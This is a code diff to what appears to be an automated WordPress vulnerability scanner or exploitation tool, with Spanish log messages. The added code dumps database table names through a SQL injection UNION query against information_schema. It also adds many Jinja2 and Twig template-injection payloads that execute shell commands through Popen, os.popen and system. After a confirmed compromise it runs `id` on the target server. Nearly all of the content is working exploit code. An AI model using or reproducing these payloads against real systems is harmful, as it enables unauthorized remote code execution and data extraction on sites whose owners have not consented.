@@ -8392,6 +8392,19 @@ def verify_wordpress_sqli(
                 if "$P$" in _hashes_body or "$1$" in _hashes_body:
                     res.evidence["wp_users_hashes"] = _hashes_body[:300]
                     step("  union-extra: wp_users hashes filtrados via HTTP UNION")
+
+                # Table name dump from information_schema (generic, works on any DB)
+                _tables_body = _union_extract(
+                    "group_concat(table_name separator 0x2c) "
+                    "FROM information_schema.tables "
+                    "WHERE table_schema=database()-- ")
+                if _tables_body and "," in _tables_body:
+                    # Extract comma-separated table names (alphanum/underscore only)
+                    _tnames = [t.strip() for t in re.findall(r"[a-zA-Z0-9_]{2,64}", _tables_body)
+                               if len(t) >= 2][:20]
+                    if _tnames:
+                        res.evidence["db_tables"] = _tnames
+                        step(f"  union-extra: tablas del esquema actual = {', '.join(_tnames[:8])}")
             except Exception:
                 pass
 
@@ -11066,14 +11079,32 @@ def verify_wordpress_ssti(
                         _rce_candidates = [
                             (f"{{{{['{_ssti_rce_token}']|map('system')|join}}}}",
                              _ssti_rce_token, "twig_map_system"),
-                            # Jinja2: subprocess via __subclasses__
-                            (f"{{{{'echo {_ssti_rce_token}'.__class__.__mro__[1]"
-                             f".__subclasses__()[396]('echo {_ssti_rce_token}',shell=True,"
-                             f"stdout=-1).communicate()[0].decode()}}}}",
-                             _ssti_rce_token, "jinja2_subclasses"),
+                            # Jinja2: scan all subclasses for Popen (robust, no hardcoded index)
+                            (f"{{{{'echo {_ssti_rce_token}'.__class__.__mro__[1].__subclasses__()"
+                             f"|selectattr('__name__','equalto','Popen')|first"
+                             f"('echo {_ssti_rce_token}',shell=True,stdout=-1).communicate()[0].decode()}}}}",
+                             _ssti_rce_token, "jinja2_popen_selectattr"),
+                            # Jinja2: open() file read gadget (config object)
+                            (f"{{{{config.__class__.__init__.__globals__['os'].popen('echo {_ssti_rce_token}').read()}}}}",
+                             _ssti_rce_token, "jinja2_config_globals_os"),
+                            # Jinja2: request object globals
+                            (f"{{{{request.__class__.__mro__[1].__subclasses__()"
+                             f"|selectattr('__name__','equalto','Popen')|first"
+                             f"('echo {_ssti_rce_token}',shell=True,stdout=-1).communicate()[0].decode()}}}}",
+                             _ssti_rce_token, "jinja2_request_popen"),
+                            # Jinja2 fallback: hardcoded indices that commonly resolve to Popen
+                            *[
+                                (f"{{{{'x'.__class__.__mro__[1].__subclasses__()[{idx}]"
+                                 f"('echo {_ssti_rce_token}',shell=True,stdout=-1).communicate()[0].decode()}}}}",
+                                 _ssti_rce_token, f"jinja2_subclasses_{idx}")
+                                for idx in (396, 414, 258, 273, 309, 439)
+                            ],
                             # Twig: _self chain
                             (f"{{{{_self.env.registerUndefinedFilterCallback(\"system\")}}}}{{{{_self.env.getFilter('echo {_ssti_rce_token}')}}}}",
                              _ssti_rce_token, "twig_self_env"),
+                            # Twig: exec via filter
+                            (f"{{{{'{_ssti_rce_token}'|filter('system')}}}}",
+                             _ssti_rce_token, "twig_filter_system"),
                         ]
                     elif _ssti_engine == "smarty_velocity":
                         _rce_candidates = [
@@ -11102,6 +11133,26 @@ def verify_wordpress_ssti(
                                     "token_confirmed": _rce_confirm,
                                 }
                                 step(f"SSTI RCE CONFIRMADO via {_rce_tech} — token {_rce_confirm!r} en respuesta")
+                                # Post-RCE: run `id` for stronger evidence (uid=www-data)
+                                try:
+                                    _id_payload_map = {
+                                        "twig_map_system": "{{['id']|map('system')|join}}",
+                                        "jinja2_config_globals_os": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+                                    }
+                                    _id_p = _id_payload_map.get(_rce_tech, _rce_p.replace(f"echo {_ssti_rce_token}", "id"))
+                                    _id_params = dict(base_params)
+                                    _id_params[ssti_param] = _id_p
+                                    _id_resp = boot.sub_sess.request(
+                                        m, boot.base_url + endpoint,
+                                        data=_id_params if m != "GET" else None,
+                                        params=_id_params if m == "GET" else None, timeout=15)
+                                    _id_body = (_id_resp.text or "")
+                                    _id_m = re.search(r"uid=\d+\([^)]+\)", _id_body)
+                                    if _id_m:
+                                        res.evidence["ssti_rce_id_output"] = _id_m.group(0)
+                                        step(f"SSTI RCE escalado: id={_id_m.group(0)}")
+                                except Exception:
+                                    pass
                                 break
                         except Exception:
                             pass
